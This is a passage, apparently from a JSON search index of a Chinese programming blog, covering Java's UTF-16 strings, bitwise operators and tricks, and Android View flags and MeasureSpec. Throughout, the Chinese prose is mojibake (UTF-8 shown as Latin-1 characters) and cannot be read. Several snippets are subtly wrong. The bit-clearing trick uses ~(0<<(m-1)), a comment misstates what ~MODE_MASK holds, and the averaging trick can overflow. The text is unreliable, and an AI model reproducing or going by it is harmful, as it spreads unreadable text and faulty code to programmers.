ä¸ºä»€ä¹ˆjavaç”¨utf-16javaæœ€æ—©ç”¨çš„æ˜¯UCS-2(ä»¥ä¸º16ä¸ªbitè¶³ä»¥è¡¨è¾¾æ‰€æœ‰å­—ç¬¦é›†ï¼Œéšç€unicodeçš„å‘å±•ï¼Œå‘ç°16ä¸ªä¹Ÿä¸å¤Ÿäº†)ï¼Œä½†å†å²ä¸Šutf-16ä¸€å¼€å§‹æ˜¯å›ºå®šé•¿åº¦ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œåé¢å‘ç°ä¸å¤Ÿè¡¨ç¤ºunicodeäº†å°±æ”¹æˆå˜é•¿çš„ï¼Œ16æˆ–è€…32bit.Since 16 bits can only contain the range of characters from 0x0 to 0xFFFF, some additional complexity is used to store values above this range (0x10000 to 0x10FFFF). This is done using pairs of code units known as surrogates.UTF-8 requires either 8, 16, 24 or 32 bits (one to four octets) to encode a Unicode character, UTF-16 requires either 16 or 32 bits to encode a character, and UTF-32 always requires 32 bits to encode a character.Javaçš„Stringå†…å­˜å‚¨çš„å­—ç¬¦ä¸²ä½¿ç”¨çš„æ˜¯Unicodeç¼–ç ï¼ˆé»˜è®¤ä½¿ç”¨UTF16ç¼–ç ï¼‰ï¼ŒUnicodeæ˜¯å¯æ‰©å±•çš„ï¼Œä¸è¿‡ç›®å‰å¤§éƒ¨åˆ†æƒ…å†µä¸‹UTF16åªç”¨åˆ°äº†2ä¸ªå­—èŠ‚ï¼ˆå¤§å¤šæ•°éç”Ÿåƒ»æ±‰å­—è¿˜æ˜¯å¯ä»¥ç”¨ä¸¤ä¸ªbyteæå®šçš„ï¼‰ public static String getRandomChar(){ char[] arr = {&#39;ä¸€&#39;,&#39;äºŒ&#39;,&#39;ä¸‰&#39;,&#39;å››&#39;,&#39;äº”&#39;}; return &quot;&quot; + arr[1] + arr[2] +arr[4]; } public static void main(String[] args) { String cc = getRandomChar(); System.out.println(&quot;è¾“å‡ºçš„æ–‡å­—æ˜¯&quot; + cc);// è¾“å‡ºçš„æ–‡å­—æ˜¯äºŒä¸‰äº” } è€Œåœ¨cè¯­è¨€ä¸­ï¼Œä¸€ä¸ªå­—ç¬¦(char)åªéœ€è¦1ä¸ªå­—èŠ‚ å‚è€ƒ Jesse Wilson | Decoding the Secrets of Binary Data æ·±å…¥åˆ†æ Java ä¸­çš„ä¸­æ–‡ç¼–ç é—®é¢˜IBMå‡ºå“,éå¸¸å¥½ï¼Œç”šè‡³å‘Šè¯‰ä½ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‡ºç°å“ªç§å¥‡æ€ªçš„æ˜¾ç¤ºç¬¦å· emoji complete list","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"ä½è¿ç®—æ€»ç»“","date":"2017-07-23T19:06:46.000Z","path":"2017/07/23/2017-07-23-manipulating-bits/","text":"ä½è¿ç®—çš„å¥½å¤„è‡³å°‘æœ‰ä¸¤ç‚¹ï¼Œç”±äºæ˜¯ç›´æ¥æ“ä½œbit,æ²¡æœ‰ä»»ä½•åŒ…è£…ç±»ï¼Œé€Ÿåº¦å¿«ã€‚å¦å¤–ä¸€ä¸ªå°±æ˜¯èŠ‚çœå†…å­˜äº†ã€‚ 1.å·¦ç§»ï¼ˆ&lt;&lt;ï¼‰public class Test { public static void main(String[] args) { System.out.println(5&lt;&lt;2);//è¿è¡Œç»“æœæ˜¯20 } } åŸç†ï¼š5çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ–¹å¼æ˜¯ï¼š0000 0000 0000 0000 0000 0000 0000 0101å‘å·¦æŒªä¸¤ä½å°±å˜æˆäº†0000 0000 0000 0000 0000 0000 0001 0100 //æœ«ä½è¡¥é›¶ ï¼Œä¹Ÿå°±æ˜¯20 å¯ä»¥è®¤ä¸º 5&lt;&lt;nå°±ä»£è¡¨ä¹˜ä»¥2çš„næ¬¡æ–¹æ‰€ä»¥10KBå¯ä»¥è¿™ä¹ˆå†™ ï¼š 10&lt;&lt;10 2.å³ç§»(&gt;&gt;)å’Œå·¦ç§»åè¿‡æ¥ï¼Œå‰é¢è¡¥0ã€‚ä¸€æ ·çš„é“ç†ï¼Œä¸å†èµ˜è¿°ã€‚ 3. æ— ç¬¦å·å³ç§»(&gt;&gt;&gt;)åœ¨javaä¸­ä¸€ä¸ªintå 32ä½ï¼Œæ­£æ•°çš„é¦–ä½æ˜¯0ï¼Œè´Ÿæ•°ä½-1ã€‚é¦–å…ˆè¯´ä¸€ä¸‹è´Ÿæ•°æ€ä¹ˆç®—å‡ºæ¥äºŒè¿›åˆ¶è¡¨ç¤ºçš„(åŸç ï¼Œè¡¥ç ï¼Œåç )åœ¨è®¡ç®—æœºä¸­ï¼Œè´Ÿæ•°ä»¥å…¶æ­£å€¼çš„è¡¥ç å½¢å¼è¡¨è¾¾ è®¡ç®—æœºå¯¹æœ‰ç¬¦å·æ•°ï¼ˆåŒ…æ‹¬æµ®ç‚¹æ•°ï¼‰çš„è¡¨ç¤ºæœ‰ä¸‰ç§æ–¹æ³•ï¼šåŸç ã€åç å’Œè¡¥ç ï¼Œ è¡¥ç =åç +1ã€‚åœ¨ äºŒè¿›åˆ¶é‡Œï¼Œæ˜¯ç”¨ 0 å’Œ 1 æ¥è¡¨ç¤ºæ­£è´Ÿçš„ï¼Œæœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œæœ€é«˜ä½ä¸º 1 ä»£è¡¨è´Ÿæ•°ï¼Œæœ€é«˜ä½ä¸º 0 ä»£è¡¨æ­£æ•°ã€‚ ä»¥-5ä¸ºä¾‹ å…ˆå°†-5çš„ç»å¯¹å€¼è½¬æˆäºŒè¿›åˆ¶ï¼š 00000000 00000000 00000000 00000101 ç„¶åæ±‚è¯¥äºŒè¿›åˆ¶çš„åç (~)ï¼Œ ä¹Ÿå°±æ˜¯0å˜æˆ1,1å˜æˆ0ï¼Œå¾—åˆ°11111111 11111111 11111111 11111010 ç„¶åæŠŠå¾—åˆ°çš„åç åŠ 1 ï¼Œå¾—åˆ°11111111 11111111 11111111 11111010 + 1 = 11111111 11111111 11111111 11111011 å› æ­¤-5 å°±æ˜¯11111111 11111111 11111111 111110110xFFFFFFFBï¼ˆ16è¿›åˆ¶å†™æ³•ï¼‰ æ­£æ•°å³ç§»ï¼Œé«˜ä½ç”¨0è¡¥ï¼›è´Ÿæ•°å³ç§»ï¼Œé«˜ä½ç”¨1è¡¥ï¼›è´Ÿæ•°æ— ç¬¦å·å³ç§»ï¼Œç”¨0è¡¥é«˜ä½ã€‚ æ‰€ä»¥-5&gt;&gt;&gt;3 ä¹Ÿå°±å˜æˆäº†0001 1111 1111 1111 1111 1111 1111 1111 //åè¿›åˆ¶536870911 æ³¨æ„ï¼Œæ­£æ•°æˆ–è€…è´Ÿæ•°å·¦ç§»ï¼Œä½ä½éƒ½æ˜¯ç”¨0è¡¥ 4. ä½ä¸(&amp;)çœ‹å®ä¾‹: public static void main(String[] args) { System.out.println(5 &amp; 3);//ç»“æœä¸º1 } åŸå› ï¼š 5çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0101 3çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0011åŒä¸€ä½ä¸Šå¿…é¡»éƒ½ä¸º1ï¼Œç»“æœæ‰ä¸º1ï¼Œå¦åˆ™ä¸º0ï¼›äºæ˜¯ç»“æœå°±å¾—åˆ°ï¼š 0000 0000 0000 0000 0000 0000 0000 0001 = 1 5. ä½æˆ–ï¼ˆ|ï¼‰å’Œä½ä¸ç›¸ååŒä¸€ä½ä¸Šåªè¦æœ‰ä¸€ä¸ªä¸º1ï¼Œå°±ä¸º1.åªæœ‰ä¸¤ä¸ªéƒ½ä¸º0ï¼Œæ‰ä¸º0.äºŒè¿›åˆ¶ä¸‹ï¼š 5çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0101 3çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0011æ‰€ä»¥ç»“æœæ˜¯ 7 0000 0000 0000 0000 0000 0000 0000 0111æ‰€ä»¥ (5|3) = 7(è¿™è®©äººæƒ³åˆ°linuxæ–‡ä»¶æƒé™çš„777) å…¶å®å°±æ˜¯ 111 111 111 ï¼ˆowner,creater,othersï¼‰ 6. ä½å¼‚æˆ–(^)è¿˜æ˜¯æ‹¿5å’Œ3ä¸€èµ·ç®—ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„çš„ç¬¬nä½äºç¬¬äºŒä¸ªæ“ä½œæ•°çš„ç¬¬nä½ ç›¸åï¼Œé‚£ä¹ˆç»“æœçš„ç¬¬nä¸ºä¹Ÿä¸º1ï¼Œå¦åˆ™ä¸º0äºŒè¿›åˆ¶ä¸‹ï¼š 5çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0101 3çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0011æ‰€ä»¥ç»“æœæ˜¯ 6 0000 0000 0000 0000 0000 0000 0000 0110æ‰€ä»¥a^bå¯ä»¥ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªFlagå‰åæœ‰æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œæœ‰æ—¶å€™å¦‚æœå‘ç°å‰åflagæ²¡æœ‰å˜åŒ–ï¼Œå³ä¸æ“ä½œã€‚ 7.ä½é(~)ä½éæ˜¯ä¸€å…ƒæ“ä½œç¬¦ï¼Œå¯¹ä¸€ä¸ªæ•°è¿›è¡Œæ“ä½œä½éï¼šæ“ä½œæ•°çš„ç¬¬nä½ä¸º1ï¼Œé‚£ä¹ˆç»“æœçš„ç¬¬nä½ä¸º0ï¼Œåä¹‹ä¸º1ï¼Œå°±æ˜¯æ‰€æœ‰çš„1å˜æˆ0,0å˜æˆ1ã€‚ 5çš„äºŒè¿›åˆ¶æ˜¯ï¼š 0000 0000 0000 0000 0000 0000 0000 0101 å€’è¿‡æ¥å°±æ˜¯ï¼š 1111 1111 1111 1111 1111 1111 1111 1010è´Ÿæ•´æ•°è½¬äºŒè¿›åˆ¶çš„æ ‡å‡†æ–¹æ³•ï¼šå…ˆæ˜¯å°†å¯¹åº”çš„æ­£æ•´æ•°è½¬æ¢æˆäºŒè¿›åˆ¶åï¼Œå¯¹äºŒè¿›åˆ¶å–åï¼Œç„¶åå¯¹ç»“æœå†åŠ ä¸€ã€‚ 8.ä¸€äº›è¡ç”Ÿçš„æ“ä½œç¬¦ä»ä¸Šé¢çš„ä¸€äº›åŸºæœ¬æ“ä½œç¬¦è¡ç”Ÿæ¥çš„æœ‰ &amp;= æŒ‰ä½ä¸èµ‹å€¼ |= æŒ‰ä½æˆ–èµ‹å€¼ ^= æŒ‰ä½éèµ‹å€¼ &gt;&gt;= å³ç§»èµ‹å€¼ &gt;&gt;&gt;= æ— ç¬¦å·å³ç§»èµ‹å€¼ &lt;&lt;= èµ‹å€¼å·¦ç§» å’Œ+=ä¸€ä¸ªæ„æ€ã€‚è‡³äºé‚£ä¸ªè¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œç®—äº†å§ã€‚ 9.ä¸€äº›å¸¸ç”¨çš„å°æŠ€å·§// 1. è·å¾—intå‹æœ€å¤§å€¼System.out.println((1 &lt;&lt; 31) - 1);// 2147483647ï¼Œ ç”±äºä¼˜å…ˆçº§å…³ç³»ï¼Œæ‹¬å·ä¸å¯çœç•¥System.out.println(~(1 &lt;&lt; 31));// 2147483647 // 2. è·å¾—intå‹æœ€å°å€¼System.out.println(1 &lt;&lt; 31);System.out.println(1 &lt;&lt; -1); // 3. è·å¾—longç±»å‹çš„æœ€å¤§å€¼System.out.println(((long)1 &lt;&lt; 127) - 1); // 4. ä¹˜ä»¥2è¿ç®—System.out.println(10&lt;&lt;1); // 5. é™¤ä»¥2è¿ç®—(è´Ÿå¥‡æ•°çš„è¿ç®—ä¸å¯ç”¨)System.out.println(10&gt;&gt;1); // 6. ä¹˜ä»¥2çš„mæ¬¡æ–¹System.out.println(10&lt;&lt;2); // 7. é™¤ä»¥2çš„mæ¬¡æ–¹System.out.println(16&gt;&gt;2); // 8. åˆ¤æ–­ä¸€ä¸ªæ•°çš„å¥‡å¶æ€§System.out.println((10 &amp; 1) == 1);System.out.println((9 &amp; 1) == 1); // 9. ä¸ç”¨ä¸´æ—¶å˜é‡äº¤æ¢ä¸¤ä¸ªæ•°ï¼ˆé¢è¯•å¸¸è€ƒï¼‰a ^= b;b ^= a;a ^= b; // 10. å–ç»å¯¹å€¼ï¼ˆæŸäº›æœºå™¨ä¸Šï¼Œæ•ˆç‡æ¯”n&gt;0 ? n:-n é«˜ï¼‰int n = -1;System.out.println((n ^ (n &gt;&gt; 31)) - (n &gt;&gt; 31));/* n&gt;&gt;31 å–å¾—nçš„ç¬¦å·ï¼Œè‹¥nä¸ºæ­£æ•°ï¼Œn&gt;&gt;31ç­‰äº0ï¼Œè‹¥nä¸ºè´Ÿæ•°ï¼Œn&gt;&gt;31ç­‰äº-1è‹¥nä¸ºæ­£æ•° n^0-0æ•°ä¸å˜ï¼Œè‹¥nä¸ºè´Ÿæ•°n^-1 éœ€è¦è®¡ç®—nå’Œ-1çš„è¡¥ç ï¼Œå¼‚æˆ–åå†å–è¡¥ç ï¼Œç»“æœnå˜å·å¹¶ä¸”ç»å¯¹å€¼å‡1ï¼Œå†å‡å»-1å°±æ˜¯ç»å¯¹å€¼ // 11. å–ä¸¤ä¸ªæ•°çš„æœ€å¤§å€¼ï¼ˆæŸäº›æœºå™¨ä¸Šï¼Œæ•ˆç‡æ¯”a&gt;b ? a:bé«˜ï¼‰System.out.println(b&amp;((a-b)&gt;&gt;31) | a&amp;(~(a-b)&gt;&gt;31)); // 12. å–ä¸¤ä¸ªæ•°çš„æœ€å°å€¼ï¼ˆæŸäº›æœºå™¨ä¸Šï¼Œæ•ˆç‡æ¯”a&gt;b ? b:aé«˜ï¼‰System.out.println(a&amp;((a-b)&gt;&gt;31) | b&amp;(~(a-b)&gt;&gt;31)); // 13. åˆ¤æ–­ç¬¦å·æ˜¯å¦ç›¸åŒ(true è¡¨ç¤º xå’Œyæœ‰ç›¸åŒçš„ç¬¦å·ï¼Œ falseè¡¨ç¤ºxï¼Œyæœ‰ç›¸åçš„ç¬¦å·ã€‚)System.out.println((a ^ b) &gt; 0);æ‰€ä»¥åœ¨Androidçš„View.javaä¸­ void setFlags(int flags, int mask) { final boolean accessibilityEnabled = AccessibilityManager.getInstance(mContext).isEnabled(); final boolean oldIncludeForAccessibility = accessibilityEnabled &amp;&amp; includeForAccessibility(); int old = mViewFlags; mViewFlags = (mViewFlags &amp; ~mask) | (flags &amp; mask); int changed = mViewFlags ^ old; //å¦‚æœå’Œæ—§çš„flagä¸€è‡´ï¼Œç›´æ¥return if (changed == 0) { return; } // ä»¥ä¸‹çœç•¥ã€ã€ã€ã€ã€ã€ã€ } // 14. è®¡ç®—2çš„næ¬¡æ–¹ n &gt; 0System.out.println(2&lt;&lt;(n-1)); // 15. åˆ¤æ–­ä¸€ä¸ªæ•°næ˜¯ä¸æ˜¯2çš„å¹‚System.out.println((n &amp; (n - 1)) == 0);/å¦‚æœæ˜¯2çš„å¹‚ï¼Œnä¸€å®šæ˜¯100â€¦ n-1å°±æ˜¯1111â€¦.æ‰€ä»¥åšä¸è¿ç®—ç»“æœä¸º0/ // 16. æ±‚ä¸¤ä¸ªæ•´æ•°çš„å¹³å‡å€¼System.out.println((a+b) &gt;&gt; 1); // 17. ä»ä½ä½åˆ°é«˜ä½,å–nçš„ç¬¬mä½int m = 2;System.out.println((n &gt;&gt; (m-1)) &amp; 1); // 18. ä»ä½ä½åˆ°é«˜ä½.å°†nçš„ç¬¬mä½ç½®ä¸º1System.out.println(n | (1&lt;&lt;(m-1)));/å°†1å·¦ç§»m-1ä½æ‰¾åˆ°ç¬¬mä½ï¼Œå¾—åˆ°000â€¦1â€¦000nåœ¨å’Œè¿™ä¸ªæ•°åšæˆ–è¿ç®—/ // 19. ä»ä½ä½åˆ°é«˜ä½,å°†nçš„ç¬¬mä½ç½®ä¸º0System.out.println(n &amp; ~(0&lt;&lt;(m-1)));/ å°†1å·¦ç§»m-1ä½æ‰¾åˆ°ç¬¬mä½ï¼Œå–ååå˜æˆ111â€¦0â€¦1111nå†å’Œè¿™ä¸ªæ•°åšä¸è¿ç®—/ //ä¸ç”¨åŠ å‡ä¹˜é™¤è®¡ç®—å®ç°ä¸€ä¸ªåŠ æ³• public class Solution { public int Add(int num1,int num2) { while (num2!=0) { int temp = num1^num2; num2 = (num1&amp;num2)&lt;&lt;1; num1 = temp; } return num1; } } ç‰›å®¢ç½‘é¦–å…ˆçœ‹åè¿›åˆ¶æ˜¯å¦‚ä½•åšçš„ï¼š 5+7=12ï¼Œä¸‰æ­¥èµ°ç¬¬ä¸€æ­¥ï¼šç›¸åŠ å„ä½çš„å€¼ï¼Œä¸ç®—è¿›ä½ï¼Œå¾—åˆ°2ã€‚ç¬¬äºŒæ­¥ï¼šè®¡ç®—è¿›ä½å€¼ï¼Œå¾—åˆ°10. å¦‚æœè¿™ä¸€æ­¥çš„è¿›ä½å€¼ä¸º0ï¼Œé‚£ä¹ˆç¬¬ä¸€æ­¥å¾—åˆ°çš„å€¼å°±æ˜¯æœ€ç»ˆç»“æœã€‚ ç¬¬ä¸‰æ­¥ï¼šé‡å¤ä¸Šè¿°ä¸¤æ­¥ï¼Œåªæ˜¯ç›¸åŠ çš„å€¼å˜æˆä¸Šè¿°ä¸¤æ­¥çš„å¾—åˆ°çš„ç»“æœ2å’Œ10ï¼Œå¾—åˆ°12ã€‚ åŒæ ·æˆ‘ä»¬å¯ä»¥ç”¨ä¸‰æ­¥èµ°çš„æ–¹å¼è®¡ç®—äºŒè¿›åˆ¶å€¼ç›¸åŠ ï¼š 5-101ï¼Œ7-111 ç¬¬ä¸€æ­¥ï¼šç›¸åŠ å„ä½çš„å€¼ï¼Œä¸ç®—è¿›ä½ï¼Œå¾—åˆ°010ï¼ŒäºŒè¿›åˆ¶æ¯ä½ç›¸åŠ å°±ç›¸å½“äºå„ä½åšå¼‚æˆ–æ“ä½œï¼Œ101^111ã€‚ ç¬¬äºŒæ­¥ï¼šè®¡ç®—è¿›ä½å€¼ï¼Œå¾—åˆ°1010ï¼Œç›¸å½“äºå„ä½åšä¸æ“ä½œå¾—åˆ°101ï¼Œå†å‘å·¦ç§»ä¸€ä½å¾—åˆ°1010ï¼Œ(101&amp;111)&lt;&lt;1ã€‚ ç¬¬ä¸‰æ­¥é‡å¤ä¸Šè¿°ä¸¤æ­¥ï¼Œ å„ä½ç›¸åŠ  010^1010=1000ï¼Œè¿›ä½å€¼ä¸º100=(010&amp;1010)&lt;&lt;1ã€‚ ç»§ç»­é‡å¤ä¸Šè¿°ä¸¤æ­¥ï¼š1000^100 = 1100ï¼Œè¿›ä½å€¼ä¸º0ï¼Œè·³å‡ºå¾ªç¯ï¼Œ1100ä¸ºæœ€ç»ˆç»“æœã€‚ ç»“æŸ è®°å¾—Chet Haaseå’ŒRomain Guyæ›¾ç»åœ¨2013å¹´çš„ä¸€æ¬¡æ¼”è®²ä¸­æåˆ°,Androidä¸­Viewå†…éƒ¨ä½¿ç”¨äº†3ä¸ªintæ¥è¡¨ç¤º70å¤šä¸ªFlagsã€‚å¦‚æœæ¢åšboolean(4byteå¤§å°)çš„è¯ï¼Œå°±éœ€è¦æ¥è¿‘300bytesã€‚ç”±äºViewåœ¨Applicationä¸­è¢«å¹¿æ³›ï¼ˆæˆç™¾ä¸Šåƒï¼‰ä½¿ç”¨ï¼Œframeworkè¿™æ ·åšäº‹å®ä¸Šä¸ºå¼€å‘è€…èŠ‚çº¦äº†ç›¸å½“å¤šçš„å†…å­˜ã€‚View.javaé‡Œé¢æ”¾äº†å¥½å‡ ä¸ªflagsã€‚android.view.View.java /* @hide */ public int mPrivateFlags; int mPrivateFlags2; int mPrivateFlags3; // The view flags hold various views states. int mViewFlags; intä¸­çš„æ¯ä¸€ä¸ªbitéƒ½æˆä¸ºä¸€ä¸ªbooleanï¼Œä¸€å…±åªç”¨äº†12bytes(96bits)çš„å†…å­˜.å’Œ300bytesç›¸æ¯”ï¼ŒèŠ‚çœçš„å†…å­˜æ€»é‡è¿˜æ˜¯ç›¸å½“å¯è§‚çš„ã€‚ä¸€ä¸ªonClickListenerå¤§æ¦‚500bytesæ‰€ä»¥View.javaä¸­åˆ°å¤„æ˜¯è¿™æ ·çš„å¥‡æ€ªçš„Flags public void setDrawingCacheEnabled(boolean enabled) { mCachingFailed = false; setFlags(enabled ? 0x00008000 : 0, 0x00008000); } @ViewDebug.ExportedProperty(category = &quot;drawing&quot;) public boolean isDrawingCacheEnabled() { return (mViewFlags &amp; 0x00008000) == 0x00008000; } é™¤äº†çœå†…å­˜ï¼Œä½è¿ç®—é€Ÿåº¦å¿«ä¹Ÿæœ‰ä¸€å®šçš„å¥½å¤„ã€‚ æ¥çœ‹çœ‹Androidä¸­çš„ViewGroupæ˜¯æ€ä¹ˆå¹²çš„ // Set by default static final int FLAG_CLIP_CHILDREN = 0x1; //äºŒè¿›åˆ¶çš„1 private static final int FLAG_CLIP_TO_PADDING = 0x2; //äºŒè¿›åˆ¶çš„10 static final int FLAG_INVALIDATE_REQUIRED = 0x4; //äºŒè¿›åˆ¶ 100 private static final int FLAG_RUN_ANIMATION = 0x8; //äºŒè¿›åˆ¶1000 static final int FLAG_ANIMATION_DONE = 0x10; //äºŒè¿›åˆ¶ 10000 private static final int FLAG_PADDING_NOT_NULL = 0x20;//äºŒè¿›åˆ¶ 100000 /** @deprecated - functionality removed */ private static final int FLAG_ANIMATION_CACHE = 0x40;//äºŒè¿›åˆ¶ 1000000 static final int FLAG_OPTIMIZE_INVALIDATE = 0x80;//äºŒè¿›åˆ¶ 10000000 static final int FLAG_CLEAR_TRANSFORMATION = 0x100;//äºŒè¿›åˆ¶ 100000000 private static final int FLAG_NOTIFY_ANIMATION_LISTENER = 0x200;//äºŒè¿›åˆ¶ 1000000000 protected static final int FLAG_USE_CHILD_DRAWING_ORDER = 0x400;//äºŒè¿›åˆ¶ 10000000000 //è¿˜æœ‰æ›´å¤šã€‚ if ((flags &amp; FLAG_INVALIDATE_REQUIRED) == FLAG_INVALIDATE_REQUIRED) { //æŒ‰ä¸ºä¸ ä¸¤ä¸ªéƒ½ä¸º1æ‰ä¸º1ï¼Œæ‰€ä»¥åªæœ‰å½“å‰flagå°äºFLAG_INVALIDATE_REQUIREDçš„æ—¶å€™è¿™ä¸ªè¡¨è¾¾å¼æ‰æˆç«‹ invalidate(true); } java-integer-flag-and-bitwise-operations-for-memory-reductionstackoverflowä¸Šæœ‰äººå›ç­”äº†å…³äºç”¨ä¸€ä¸ªintçš„flagæ›¿ä»£32ä¸ªbooleançš„åˆ©å¼Šã€‚è¦ç‚¹å¦‚ä¸‹: å¤§å¤šæ•°jvm implementationéƒ½ä»¥ä¸€ä¸ªintçš„æ–¹å¼å­˜å‚¨booleanå¦‚æœä¸€ä¸ªclassé‡Œé¢æ»¥ç”¨ä¸€å¤§å †booleanï¼Œä½†è¿™ä¸ªclassçš„å®ä¾‹ä¸è¿‡å‡ ç™¾ä¸ªï¼Œé‚£ä¹ˆä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆå½±å“ä½è¿ç®—å¯¹äºcpuæ¥è¯´éå¸¸å¿«jdkæä¾›äº†BitSetï¼Œå±äºä¸€ç§å¼€ç®±å³ç”¨çš„bitæ“ä½œå·¥å…· ä¸‹é¢æ˜¯google å…³é”®è¯ int flagæ‰¾åˆ°çš„ä¸€æ®µjavaä»£ç ã€‚è¿™æ˜¯ä»£è¡¨å„ç§stateä¹‹é—´äº’æ–¥çš„ã€‚ public static final int UPPERCASE = 1; // 0001 public static final int REVERSE = 2; // 0010 public static final int FULL_STOP = 4; // 0100 public static final int EMPHASISE = 8; // 1000 public static final int ALL_OPTS = 15; // 1111 public static String format(String value, int flags) { if ((flags &amp; UPPERCASE) == UPPERCASE) value = value.toUpperCase(); if ((flags &amp; REVERSE) == REVERSE) value = new StringBuffer(value).reverse().toString(); if ((flags &amp; FULL_STOP) == FULL_STOP) value += &quot;.&quot;; if ((flags &amp; EMPHASISE) == EMPHASISE) value = &quot;~*~ &quot; + value + &quot; ~*~&quot;; return value; } å¯ä»¥æƒ³è±¡çš„æ˜¯ï¼ŒViewä¸­ä¸€ä¸ªintï¼Œ32ä¸ªå°æ§½å­(bit)ï¼Œæ¯ä¸€ä½éƒ½èƒ½ç”¨æ¥ä»£è¡¨isSelected,isFocused,XXXç­‰å±æ€§ã€‚æ£€æŸ¥æ˜¯å¦æœ‰æŸä¸ªflagåªéœ€è¦ public class BitFlags { public static boolean isFlagSet(byte value, byte flags) { return (flags &amp; value) == value;//å’Œä¸Šé¢çš„FLAG_INVALIDATE_REQUIREDä¸€æ¨¡ä¸€æ · } public static byte setFlag(byte value, byte flags) { return (byte) (flags | value); } public static byte unsetFlag(byte value, byte flags) { return (byte) (flags &amp; ~value); } } ä¸è¦è¿·ä¿¡ä½è¿ç®—ï¼Œå¯¹äºä¸€äº›ç®€å•çš„æ“ä½œï¼Œç°ä»£ç¼–è¯‘å™¨è¿˜æ˜¯èƒ½å¤Ÿå¸®åŠ©å¼€å‘è€…è‡ªåŠ¨åšå¥½ä¼˜åŒ–çš„ã€‚ ä»java7å¼€å§‹ï¼Œå¯ä»¥åœ¨javaä»£ç é‡Œç›´æ¥å†™äºŒè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶çš„æ•°å­—äº† //16è¿›åˆ¶ jdk6å†™æ³•ï¼š public static void main(String[] args) { int res = Integer.parseInt(&quot;A&quot;, 16); System.out.println(res); } jdk7å†™æ³•ï¼š public static void main(String[] args) { int res = 0xA; System.out.println(res); } // 8è¿›åˆ¶ jdk6å†™æ³•: public static void main(String[] args) { int res = Integer.parseInt(&quot;11&quot;,8); System.out.println(res); } jdk7å†™æ³•: public static void main(String[] args) { int res = 011; System.out.println(res); } //äºŒè¿›åˆ¶ jdk6å†™æ³•: public static void main(String[] args) { int res = Integer.parseInt(&quot;1100110&quot;, 2); System.out.println(res); } jdk7å†™æ³•: public static void main(String[] args) { int res = 0b1100110; System.out.println(res); } å³ï¼šäºŒè¿›åˆ¶ï¼š int res = 0b110; å…­ï¼ˆ0Bä¹Ÿè¡Œï¼Œ0b01_10010_0è¿™ç§åŠ ä¸‹åˆ’çº¿ä¹Ÿè¡Œï¼‰å…«è¿›åˆ¶ï¼š int res = 0110; ä¸ƒåäºŒåå…­è¿›åˆ¶ï¼š int res = 0xA; å View.MeasureSpecå°±æ˜¯32ä½çš„intå‰2ä½æ˜¯mode(èƒ½è¡¨ç¤ºå››ç§ï¼Œå¤Ÿäº†),å30ä½æ˜¯sizeæ–‡æ¡£çš„å®šä¹‰æ˜¯ï¼šMeasureSpecs are implemented as ints to reduce object allocation. This classis provided to pack and unpack the size, mode tuple into the intå°±æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œæ‰ç”¨çš„ä½è¿ç®— public static class MeasureSpec { private static final int MODE_SHIFT = 30; private static final int MODE_MASK = 0x3 &lt;&lt; MODE_SHIFT; /** @hide */ @IntDef({UNSPECIFIED, EXACTLY, AT_MOST}) @Retention(RetentionPolicy.SOURCE) public @interface MeasureSpecMode {} public static final int UNSPECIFIED = 0 &lt;&lt; MODE_SHIFT;//(å°±æ˜¯00åé¢è·Ÿ30ä¸ª0) public static final int EXACTLY = 1 &lt;&lt; MODE_SHIFT;//ï¼ˆå°±æ˜¯01åé¢è·Ÿ30ä¸ª0ï¼‰ public static final int AT_MOST = 2 &lt;&lt; MODE_SHIFT;// (å°±æ˜¯10åé¢è·Ÿ30ä¸ª0) public static int getMode(int measureSpec) { //noinspection ResourceType return (measureSpec &amp; MODE_MASK); //æŒ‰ä½ä¸ï¼Œéƒ½æ˜¯1æ‰èƒ½å¾—åˆ°1ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªIntçš„32ä½ä¸­å‰ä¸¤ä½æå–å‡ºæ¥ } public static int getSize(int measureSpec) { return (measureSpec &amp; ~MODE_MASK); //æŒ‰ä½ä¸åŠ ä¸Šä½éï¼ŒäºŒè¿›åˆ¶å–åï¼Œç»“æœåŠ ä¸€ } // ~MODE_MASKå°±æ˜¯01åé¢è·Ÿ30ä¸ª0ï¼Œæ‰€ä»¥ç­‰äºç›´æ¥æŠŠmeasureSpecåä¸‰åä½æ‹¿å‡ºæ¥è½¬æˆintã€‚ } æ‰€ä»¥å°±æ˜¯ä¸€ä¸ªintå­˜äº†çŠ¶æ€ä»¥åŠå¤§å°ä¸¤éƒ¨åˆ†ä¿¡æ¯ã€‚å¤šè¯´ä¸€å¥measureSpecæ˜¯åœ¨ViewGroup.getChildMeasureSpecé‡Œé¢ç®—å‡ºæ¥çš„ï¼Œæ˜¯parentç”¨æ¥è·Ÿchildäº¤æµçš„ï¼Œä¸€èˆ¬ç”¨View.resolveSizeå°±çŸ¥é“åˆ°åº•å¾—å¤šå¤§äº†ã€‚ åç§° å«ä¹‰ æ•°å€¼ï¼ˆäºŒè¿›åˆ¶ï¼‰ å…·ä½“è¡¨ç° UNSPECIFIED çˆ¶Viewä¸å¯¹å­View æ–½åŠ ä»»ä½•çº¦æŸï¼Œå­Viewå¯ä»¥æ˜¯å®ƒæƒ³è¦çš„ä»»ä½•å°ºå¯¸ 00 